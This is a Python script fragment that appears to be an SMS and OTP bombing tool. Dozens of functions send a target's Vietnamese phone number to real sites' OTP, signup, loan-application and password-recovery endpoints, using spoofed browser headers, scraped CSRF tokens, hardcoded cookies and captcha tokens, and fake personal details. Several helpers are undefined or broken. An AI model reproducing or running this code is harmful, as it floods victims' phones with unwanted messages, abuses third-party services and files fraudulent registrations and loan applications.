    "gtd-client-tracking-device-id": "85519cab-85d7-4881-abfa-65d2a2bb3a52",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Linux x8664; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "content-type": "application/json",
    "origin": "https://www.gotadi.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://www.gotadi.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
  }
  
  postData = {
    "phoneNumber": sdt,
    "language": "VI"
  }
  
  data = json.dumps(postData)
  
  response = requests.post("https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp", data=data, headers=headers)

def VIETID(sdt):
    # perform a GET request to the login page to retrieve the csrf token
    url = 'https://oauth.vietid.net/rb/login?next=https%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F'
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "Accept-Encoding": "gzip, deflate, br"
    }
    csrfget_response = requests.get(url, headers=headers)
    
    if csrfget_response.status_code == 200:
        # extract the csrf token from the response
        csrf = csrfget_response.text.split('name="csrf-token" value="')[1].split('"')[0]

        # post the phone number and the csrf token to the login page to actually log in
        url = 'https://oauth.vietid.net/rb/login'
        payload = {'authenticity_token': csrf, 'phone': sdt }
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Referer": "https://oauth.vietid.net/rb/login",
            "Accept-Encoding": "gzip, deflate, br"
        }
        response = requests.post(url, data=payload, headers=headers)
        status_code = response.status_code

def VAMO(sdt):
    headers = [
        "Host: vamo.vn",
        "Content-Length: 24",
        "sec-ch-ua: \"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/json",
        "sec-ch-ua-mobile: ?1",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform: \"Android\"",
        "Origin: https://vamo.vn",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://vamo.vn/app/login",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie: _ga_1HXSGSN1HG=GS1.1.1683203760.3.1.1683203783.0.0.0"
    ]
    data = json.dumps({"username": sdt[1:11]})
    options = {
        "http": {
            "method": "POST",
            "header": "\r\n".join(headers),
            "content": data,
        }
    }
    context = ssl._create_unverified_context()
    response = urlopen("https://vamo.vn/ws/api/public/login-with-otp/generate-otp", data=data.encode(), context=context)
    http_response_header = response.info()

def OLDFACEBOOK(sdt):
    url = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
    data = "email_or_username=" + urllib.parse.quote(sdt) + "&recaptcha_challenge_field="
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
        "x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"
    }
    data = data.encode('utf-8')
    req = urllib.request.Request(url, data=data, headers=headers)
    response = urllib.request.urlopen(req)

def FUNRING(sdt):
    headers = {
        "Host": "funring.vn",
        "Connection": "keep-alive",
        "Content-Length": "28",
        "Accept": "/",
        "User-Agent": "Mozilla/5.0 (Linux; Linux x8664; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "Content-Type": "application/json",
        "Origin": "http://funring.vn",
        "Referer": "http://funring.vn/module/registermobile.jsp",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "JSESSIONID=NODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; ga=GA1.2.1626827841.1679236846; gid=GA1.2.888694467.1679236846; gat=1"
    }
    
    data = {"username": sdt}
    response = requests.post("https://funring.vn/api/v1.0.1/jersey/user/getotp", data=data, headers=headers)

def BIBABO(sdt):
    headers = {
        "Host": "bibabo.vn",
        "Connection": "keep-alive",
        "Content-Length": "64",
        "Accept": "/",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://bibabo.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bibabo.vn/user/signupPhone",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "uibi=eyJpdiI6IlQyam9wWko1MGRQVXNTMnZOZEZpWGc9PSIsInZhbHVlIjoiYjV5SlR1V0tVbjdFNFwvK2FBUzIwbWZWT0YzOUdvR2cyQzZKQXI5OHFKOHM9IiwibWFjIjoiZmFiZWVkOTA0ZmE3NjJkZTRhMzI4MGQ0OWQxMTBjMmZmZjQ2ZTc0ZGYxODhlMmFiNTMwMzVlZjc0Y2MyMTg2NCJ9; ga=GA1.2.55963624.1683002314; gid=GA1.2.593754343.1683002314; mp376a95ebc99b460db45b090a5936c5demixpanel=%7B%22distinctid%22%3A%20%22%24device%3A187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24deviceid%22%3A%20%22187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24initialreferrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2Fhome%22%2C%22%24initialreferringdomain%22%3A%20%22bibabo.vn%22%7D; gat=1; gaVisitorUuid=47008ca1-32a0-4daa-9694-e36807c4dd91; fbp=fb.1.1683002315008.1108739564; XSRF-TOKEN=eyJpdiI6InNtOGtVeHBSZmVoQjR0N1wvRW1hckF3PT0iLCJ2YWx1ZSI6IlNLQ0p3UFlUZGhjdENKSFM1cHdLeXJGcFVGaE1EaDNKa0VRNk40cWo1enFCTERSTVowaEczSzc0WitTNks4am9VcE40KzAzVCtwbUVkeGVZUE1mcER3PT0iLCJtYWMiOiIzYzAxZGZmNzMxOWM3NWExOTY1MmFmYjNkMzhiOGM4OGNhMDQxNmRhZDA4YTY2ZmZhOTNjY2RhN2FiZjZlOTVmIn0%3D; laravelsession=eyJpdiI6Ind5blczNnFrMzRWbTJEbDRVcGNRaXc9PSIsInZhbHVlIjoiZXQyQUJoS3NuTXd4RUljMEhLQUZkS0Q0MEdSdGUrb09PdURXSm03d2xOS2pDRThjbERCUzlyeEpTR3VHTVUxOXd0UTVOVnppXC92WVFyOTZKS240KzBnPT0iLCJtYWMiOiJjMWQ5MWQ5YjdjYTZlODc5MjI2YmNjZTM5YjZlMWVmMThiYmRlMTIzYTI1M2E1YmIzZDc5MDExNGJlODRhYjUwIn0%3D"
    }
    
    payload = {
        "phone": sdt,
        "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"
    }    
    response = requests.post("https://bibabo.vn/user/verify-phone", headers=headers, data=payload)    

def moneydong(sdt):
    def generate_random_string(length):
        letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.choice(letters) for _ in range(length))

    headers = {
        "Host": "moneydong.vn",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generate_random_string(len("c771ff34b940c30df615b678478fce28")) + "-" + generate_random_string(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneydong.vn/vi/registernew/",
    }

    response = requests.get("https://moneydong.vn/vi/registernew/", headers=headers)
    ck = response.headers["set-cookie"].split(";")[0] + ";"

    data = 'phoneNumber=' + sdt

    headers = {
        "Host": "moneydong.vn",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generate_random_string(len("c771ff34b940c30df615b678478fce28")) + "-" + generate_random_string(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneydong.vn/vi/registernew/",
        "cookie": ck
    }

    response = requests.post("https://moneydong.vn/vi/registernew/sendsmsjson/", data=data, headers=headers)    
    
def VAYSIEUDE(sdt):
    headers = {
        "Host": "vaysieude.com",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "origin": "https://vaysieude.com",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "referer": "https://vaysieude.com/?click_id=643f76517a519600011858c1",
        "cookie": "XSRF-TOKEN=eyJpdiI6IlR2V3FVWWNXWTlMTTlWU2EySDg2V1E9PSIsInZhbHVlIjoiRzBnTHpBVUJhdFlxWWEwMHh5YVhJNmlLQnRuQjFINzl4QVBLL3Q0SVhNV0N5RHoxY1d3RWMrSVBveHRiOTBCTFB3bkp1YWtRdEtMb2JUc002UFA3YUY4VjZXTVpZUVgvNjR5N3pyeFhPeHEwbm9jT1R2ZlBqbmlaWFcwVnNGZEkiLCJtYWMiOiI1NmExYjgxZmM1MDhhMzRkNWE0Nzc0OGQ4OThhMTc2Yjk5ZGJiMjg0ZmY2Nzg1OWYwZjY3NWY5ZDI1ZjNlMDhlIn0%3D;laravel_session=eyJpdiI6ImdHZjRKWmJJaW1XZXZ3Vk8zV2kyTGc9PSIsInZhbHVlIjoic2kyZTNYWTY3SEZVM1gxZDc3UGd5ZGFpRjVBMFRwM3hiTEo0NU1BYVkzeThCb3p1bzRvMlVUdWI3elh0N3c1QmxMb3VNMEtvTFpsMW1qUVVmTmRqWE4wdWl1S2N0ajRGbWRTM1FZaUJoN21QNHgyeFBqd21VMHVBVHpmS21pMUEiLCJtYWMiOiJjMDdmM2RhMDEwYWY2Zjg5NTI5OTBjMTZjZDlkYzA5Zjc1OWUzNGFhYTI0ZjVmN2E1NDMzZDRmZWRkZTRjNThjIn0%3D"
    }
    
    response = requests.get("https://vaysieude.com/?click_id=643f76517a519600011858c1", headers=headers)
    token = response.text.split('name="_token" value="')[1].split('"')[0]
    
    data = {
        "_token": token,
        "loan[loan_amount]": "20000000",
        "loan[full_name]": "Không biết",
        "loan[identity]": "123456789",
        "loan[phone]": sdt
    }
    
    response = requests.post("https://vaysieude.com/?click_id=643f76517a519600011858c1", data=data, headers=headers)
    
def CAYDENTHAN(sdt):
    sdt = "84" + sdt
    sdt = "84" + sdt.replace("840", "")
    head = [
        "Host: api.caydenthan.vn",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "accept: */*",
        "origin: https://caydenthan.vn",
        "referer: https://caydenthan.vn/",
    ]
    data = '{"full_name":"Khang pro","first_name":"pro","last_name":"Khang","mobile_phone":"' + sdt + '","target_url":"caydenthan.vn/"}'
    get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user", data, head, False), True)
    token = get["token"]
    if token:
        head = [
            "Host: api.caydenthan.vn",
            "accept-language: vi",
            "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type: application/json",
            "authorization: Bearer " + token,
            "accept: */*",
            "origin: https://caydenthan.vn",
            "referer: https://caydenthan.vn/",
        ]
        get = json_decode(CURL("GET", "https://api.caydenthan.vn/api/user/phone-confirmation-code", None, head, False), True)
    else:
        data = '{"phone":"' + sdt + '"}'
        get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user/send-one-time-password", data, head, False), True)

def ONCREDIT(sdt):
    headers = {
        "Host": "oncredit.vn",
        "accept": "application/json, text/javascript, /; q=0.01",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://oncredit.vn",
        "referer": "https://oncredit.vn/registration",
        "cookie": "SN5c8116d5e6183=3tv1o7ton9n12jtnug96f8d8ut;OnCreditid=643e0edf695496.07498174;fptoken7c6a6574-f011-4c9a-abdd-9894a102ccef=TGp96BSUW5IwMh0JgHeUd49rmhRq1triMmGzLzWzvCI=;GNUSERIDKEY=66bb4878-093a-4dfc-9f25-3ee94accd97a;GNSESSIONIDKEY=fd64cde4-6459-4ff0-8a68-7770bd9aa247"
    }

    response = requests.get("https://oncredit.vn/registration", headers=headers)
    token = response.text.split('name="CSRFToken" content="')[1].split('"')[0]
    data = "data%5BtypeData%5D=sendCodeReg&data%5Bphone%5D=" + sdt + "&data%5Bemail%5D=khangksjjrf%40gmail.com&data%5Bcaptcha1%5D=1&data%5Blang%5D=vi&CSRFName=CSRFGuardajax&CSRFToken=" + token
    response = requests.post("https://oncredit.vn/?ajax", data=data, headers=headers)
    responsejson = response.json()
        
def VAYVND(sdt):
    head = [
        "Host: api.vayvnd.vn",
        "accept: application/json",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "origin: https://vayvnd.vn",
        "referer: https://vayvnd.vn/",
    ]
    data = '''
    {
        "phone": "'''+sdt+'''",
        "utm_campaign": "null",
        "cpa_id": 7,
        "cpa_lead_data": {
            "click_id": "''' + generateImei() + '''",
            "source_id": "source_6",
            "utm_score": "0.0'''+generateRandomstr(len("13672266155481339"))+'''"
        },
        "utm_list": [
            {
                "utm_source": "jeffapp"
            }
        ],
        "source_site": 1,
        "reg_screen_resolution": {
            "width": 412,
            "height": 915
        }
    }
    '''
    GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users", data, head, false))

def findo(sdt):
    headers = {
        "Host": "api.findo.vn",
        "accept": "application/json, text/plain, /",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.findo.vn",
        "referer": "https://www.findo.vn/"
    }

    data = {
        "mobilePhone": {
            "number": sdt
        }
    }

    response = requests.post("https://api.findo.vn/web/public/client/phone/sms-code-ts", json=data, headers=headers)
    get = response.json()   

def AHAMOVE(sdt):
    headers = {
        "Host": "api.ahamove.com",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "origin": "https://app.ahamove.com",
        "content-type": "application/json;charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept": "application/json, text/plain, /",
        "referer": "https://app.ahamove.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    mail = ''.join(random.choices(string.asciilowercase + string.digits, k=6)) + '@gmail.com'
    data = {
        'mobile': sdt,
        'name': 'Tuấn',
        'email': mail,
        'countrycode': 'VN',
        'firebasesmsauth': True
    }
    
    response = requests.post("https://api.ahamove.com/api/v3/public/user/register", json=data, headers=headers)
    
def TV360(sdt):
    url = "http://m.tv360.vn/public/v1/auth/get-otp-login"
    headers = {
        "Host": "m.tv360.vn",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "http://m.tv360.vn",
        "Referer": "http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
        "Cookie": "img-ext=avif; session-id=s%3A80c6fbad-d7e1-4dac-92a6-6cb5897bcf98.vnOf3K%2B010rNLX1ydurEP6VbvWURhbu4yAmsZ7EoxqQ; device-id=s%3Awap_649b61fe-eafa-4467-a902-894759722239.Z3iCDzH0lKHxKMRhPojvaWT%2BOFwOmZpVB11XnqALrJM; screen-size=s%3A385x854.YsJCQUjKOJSkUOYLfVhMNjngvj0EBsElrxhbkBkUaj0; access-token=; refresh-token=; msisdn=; profile=; user-id=; auto-login=1; G_ENABLED_IDPS=google"
    }
    data = {"msisdn": sdt}

    response = requests.post(url, headers=headers, data=json.dumps(data))
    access = response.json()

def POPS(sdt):
    head = [
        "Host: pops.vn",
        "content-type: application/json",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept: */*",
        "origin: https://pops.vn",
        "referer: https://pops.vn/auth/signin-signup/signup",
        "cookie: ssid=:1678719841"
    ]
    access = CURL("GET", "https://pops.vn/auth/signin-signup/signup", None, head, False)
    token = access.split('"DEFAULT_TOKEN":"')[1].split('"')[0]
    head = [
        "Host: products.popsww.com",
        "profileid: 64078d77bb84c700517c9ce4",
        "authorization: " + token,
        "x-env: production",
        "content-type: application/json",
        "lang: vi",
        "sub-api-version: 1.1",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "api-key: 5d2300c2c69d24a09cf5b09b",
        "platform: wap",
        "accept: */*",
        "origin: https://pops.vn",
        "referer: https://pops.vn/auth/signin-signup/signup",
        "cookie: ssid=:1678719841"
    ]
    data = '{"fullName":"","account":"' + sdt + '","password":"123456789","confirmPassword":"123456789"}'
    access = json(CURL("POST", "https://products.popsww.com/api/v5/auths/register", data, head, False))
    if access["meta"]:
        return {"POPS": "Thành Công"}
    elif access["error"]["statusCode"] == 400:
        data = '{"account":"' + sdt + '"}'
        access = json(CURL("POST", "https://products.popsww.com/api/v5/auths/forgotPassword", data, head, False))

def curl(method, url, data, head, headers):
    ch = requests.Session()
    ch.headers = headers
    ch.headers.update(head)
    ch.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
    ch.cookies.clear_session_cookies()
    if method.lower() == 'get':
        response = ch.get(url)
    elif method.lower() == 'post':
        response = ch.post(url, data=data)
    return response.text

def generate_random(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def generate_random_string(length):
    characters = string.hexdigits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def generate_imei():
    return generate_random_string(8) + '-' + generate_random_string(4) + '-' + generate_random_string(4) + '-' + generate_random_string(4) + '-' + generate_random_string(12)

def get_string(data):
    return str(data).replace('<', '').replace("'", '').replace('>', '').replace('?', '').replace('/', '').replace('\\', '').replace('--', '').replace('eval(', '').replace('<php', '').replace('-', '')

def get_microtime():
    return round(time.time() * 1000)

def get_token():
    return generate_random(22) + ':' + generate_random(9) + '-' + generate_random(20) + '-' + generate_random(12) + '-' + generate_random(7) + '-' + generate_random(7) + '-' + generate_random(53) + '-' + generate_random(9) + '_' + generate_random(11) + '-' + generate_random(4)

def get_secureid(length=17):
    characters = string.hexdigits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def generate_randomstr(length):
    characters = string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def echo_json(data):
    return json.dumps(data, ensure_ascii=False, indent=4)

def F88(sdt):
    head = [
        'Host: api.f88.vn',
        'accept: application/json, text/plain, */*',
        'content-encoding: gzip',
        'user-agent: Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36',
        'content-type: application/json',
        'origin: https://online.f88.vn',
        'referer: https://online.f88.vn/',
    ]
    data = '{"phoneNumber":"' + sdt + '","recaptchaResponse":"03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO","source":"Online"}'
    access = json(CURL("POST", "https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP", data, head, False))
  
def TIENOI(sdt):
  headers = {
    "Host": "app.tienoi.com.vn",
    "accept": "application/json, text/plain, /",
    "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
    "content-type": "application/json",
    "origin": "https://app.tienoi.com.vn",
    "referer": "https://app.tienoi.com.vn/auth/registration?need=2000000&days=14"
  }
  
  data = {
    "mobilePhone": sdt,
    "password": "A123456789a",
    "passwordConfirmation": "A123456789a",
    "isVoiceSms": True
  }
  
  response = requests.post("https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode", json=data, headers=headers)

def DONGPLUS(sdt):
  sdt = "84" + sdt
  sdt = sdt.split("840")[1]
  head = [
    "Host: api.dongplus.vn",
    "accept-language: vi",
    "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
    "content-type: application/json",
    "accept: */*",
    "origin: https://dongplus.vn",
    "referer: https://dongplusvn/user/login"
  ]
  data = '{"full_name":"Khang Nguyễn","first_name":"Nguyễn","last_name":"Khang","mobile_phone":"84' + sdt + '","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}'
  CURL("POST", "https://api.dongplus.vn/api/user", data, head, False)
  data = '{"phone":"84' + sdt + '"}'
  access = CURL("POST", "https://api.dongplus.vn/api/user/send-one-time-password", data, head, False)

def VIEON(sdt):
    head = {
        "Host": "api.vieon.vn",
        "accept": "application/json, text/plain, /",
        "authorization": token,
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://vieon.vn",
        "referer": "https://vieon.vn/"
    }
    data = 'phonenumber=' + sdt + '&password=123456789&givenname=&deviceid=598a3da6a4b7d1450b2a247bd080ca9d&platform=mobileweb&model=Android%2012&pushtoken=&devicename=Chrome%2F96&devicetype=desktop&ui=012021'
    access = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobileweb&ui=012021", data=data, headers=head)

def FPTPLAY(sdt):
    headers = {
        "Host": "api.fptplay.net",
        "content-length": "89",
        "sec-ch-ua": "\"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json; charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://fptplay.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://fptplay.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    data = {
        "phone": sdt,
        "country_code": "VN",
        "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8"
    }

    data_string = json.dumps(data)

    url = 'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=Eim9hpobCZPoIoVVokkIDA&e=1681802671&device=Chrome(version%3A112.0.0.0)&drm=1'
    response = requests.post(url, data=data_string, headers=headers)
 
def ALFRESCOS(sdt):
    headers = {
        "Host": "api.alfrescos.com.vn",
        "content-length": "124",
        "accept-language": "vi-VN",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
        "brandcode": "ALFRESCOS",
        "devicecode": "web",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://alfrescos.com.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://alfrescos.com.vn/",
        "accept-encoding": "gzip, deflate, br"
    }

    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN', data=json.dumps(data), headers=headers)

def PIZZAHUT(sdt):
    headers = {
        "Host": "pizzahut.vn",
        "Content-Length": "91",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform": "\"Android\"",
        "Origin": "https://pizzahut.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://pizzahut.vn/signup",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "x_polaris_sd=98vLElKu62K7WNZoG06W1nsexHNKEFnfAsoJ|T5b6wSq7Trlg9g8n/c4z|gvAgcmzDnvm7JMKJFFkFr0vYtTayscI/8HhifBDClmz/odXi8MRDqfL1scd2cfpzMcqXi3BV!!"
    }

    data = {
        "keyData": "appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone=" + sdt
    }

    response = requests.post("https://pizzahut.vn/callApiStorelet/user/registerRequest", 
                             headers=headers, 
                             data=json.dumps(data))

def SELLY(sdt):
    headers = {
        "Host": "app-api.selly.vn",
        "Connection": "keep-alive",
        "Content-Length": "98",
        "App-Version": "1.0.0",
        "DEVICE-TYPE": "mobile",
        "os-version": "10",
        "os-name": "Browser",
        "sec-ch-ua-mobile": "?1",
